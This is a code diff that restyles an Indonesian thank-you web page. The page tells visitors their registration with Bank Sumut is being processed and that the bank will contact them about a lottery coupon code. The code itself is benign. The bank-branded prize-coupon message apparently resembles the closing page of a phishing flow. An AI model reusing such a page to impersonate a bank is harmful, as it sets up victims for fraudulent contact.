@@ -5,15 +5,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Terima Kasih</title>
   <!-- Bootstrap CSS -->
-  <link
-    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
-    rel="stylesheet"
-  />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
   <!-- Google Fonts: Poppins -->
-  <link
-    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
-    rel="stylesheet"
-  />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
   <!-- SweetAlert2 -->
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <style>
@@ -21,10 +15,22 @@
     body {
       font-family: "Poppins", sans-serif;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       height: 100vh;
       margin: 0;
+    }
+
+    /* Gambar di atas */
+    .img-fluid {
+      margin: 0 auto; /* Tengah */
+      border-top-right-radius: 150px; /* Border kanan atas */
+      border-bottom-right-radius: 150px; /* Border kanan bawah */
+      max-height: 300px;
+      object-fit: cover;
+      object-position: top center; /* Gambar lebih ke atas */
+      width: 100%; /* Full width */
     }
 
     /* Container utama */
@@ -35,18 +41,7 @@
       max-width: 600px;
       width: 100%;
       text-align: center;
-    }
-
-    .header img {
-      max-width: 100%;
-      margin-bottom: 15px;
-    }
-
-    .img-fluid {
-      margin-bottom: 0;
-      border-radius: 8px;
-      max-height: 300px;
-      object-fit: cover;
+      padding: 20px;
     }
 
     /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
@@ -59,7 +54,7 @@
       font-weight: 600;
       margin-bottom: 20px;
       position: relative;
-      min-height: 120px; /* Bisa disesuaikan */
+      min-height: 120px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -67,7 +62,7 @@
 
     /* Area tempat teks diketik satu per satu */
     .typingText {
-      white-space: pre-line; /* Agar bisa multiline */
+      white-space: pre-line; /* Multiline */
       text-align: center;
       width: 100%;
     }
@@ -87,6 +82,7 @@
       margin-bottom: -10px;
       width: 130px;
     }
+
     .swal2-text-custom {
       width: 20px;
     }
@@ -94,13 +90,10 @@
 </head>
 <body onload="initPage()">
 
-  <div class="container">
-    
-    <div class="header">
-      <img src="icon.png" alt="Logo" style="height: 70px ;" />
-    </div>
-    <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />
+  <!-- Gambar paling atas -->
+  <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />
 
+  <div class="container">
     <!-- Kotak pesan dengan efek ketik (typewriter) -->
     <div class="message">
       <div id="typingContainer" class="typingText"></div>
@@ -114,10 +107,10 @@
   <audio id="thankYouAudio" src="speech.mp3"></audio>
   <script>
     const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Sumut.
-  Pendaftaran Anda Sedang Diproses.
-  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
-  Untuk Proses Cetak Kode Kupon Undian Anda.`;
-  
+Pendaftaran Anda Sedang Diproses.
+Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
+Untuk Proses Cetak Kode Kupon Undian Anda.`;
+
     function playAudio() {
       const audio = document.getElementById("thankYouAudio");
       const playPromise = audio.play();
@@ -133,12 +126,12 @@
         });
       }
     }
-  
+
     function typeWriterEffect(text, containerId, speed = 40) {
       let index = 0;
       const container = document.getElementById(containerId);
       container.innerHTML = "";
-  
+
       function typeChar() {
         if (index < text.length) {
           container.innerHTML += text.charAt(index);
@@ -148,7 +141,7 @@
       }
       typeChar();
     }
-  
+
     function showThankYouAlert() {
       Swal.fire({
         width: '320px',
@@ -169,7 +162,7 @@
         }
       });
     }
-  
+
     function initPage() {
       showThankYouAlert();
     }
